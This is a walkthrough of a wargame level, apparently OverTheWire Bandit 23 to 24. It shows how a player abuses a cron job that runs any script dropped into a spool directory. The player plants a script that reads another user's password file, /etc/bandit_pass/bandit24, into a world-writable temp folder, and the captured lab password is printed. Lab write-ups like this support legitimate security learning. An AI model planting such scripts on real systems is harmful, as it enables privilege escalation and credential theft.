# ❓Question

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…

# 📋 Walkthrough

Start looking at the cronjob first to see what we need to do next

```bash
bandit23@bandit:~$ ls /etc/cron.d
behemoth4_cleanup  cronjob_bandit22  cronjob_bandit24  leviathan5_cleanup    otw-tmp-dir
clean_tmp          cronjob_bandit23  e2scrub_all       manpage3_resetpw_job
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

Now we look what the shell-script do

```bash
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```

The script execute all script inside /var/spool/bandit24/foo and then delete it.

So we need to make a script that give us the password for bandit24. Since we cant write in the home directory so we make a temp directory and start there.

We can use nano to write the script

```bash
bandit23@bandit:~$ mktemp -d
/tmp/tmp.jVLzS9dnW5
bandit23@bandit:~$ cd /tmp/tmp.jVLzS9dnW5
```

```bash
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ nano bandit24.sh
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ cat bandit24.sh
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.jVLzS9dnW5/password
```

Then we need to give permission to these folder. Permission to write, read and execute

```bash
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ chmod 777 bandit24.sh
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ chmod 777 /tmp/tmp.jVLzS9dnW5
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ touch password
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ chmod 777 password
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ ls -la
total 4
drwxrwxrwx   2 bandit23 bandit23   80 Jul 12 07:35 .
drwxrwx-wt 102 root     root     2540 Jul 12 07:36 ..
-rwxrwxrwx   1 bandit23 bandit23   74 Jul 12 07:33 bandit24.sh
-rwxrwxrwx   1 bandit23 bandit23    0 Jul 12 07:35 password
```

Then we copy our script into the /var/spool/bandit24/foo and wait few minutes. For the cronjob to execute it

```bash
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ cp /tmp/tmp.jVLzS9dnW5/bandit24.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.jVLzS9dnW5$ cat password
hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv
```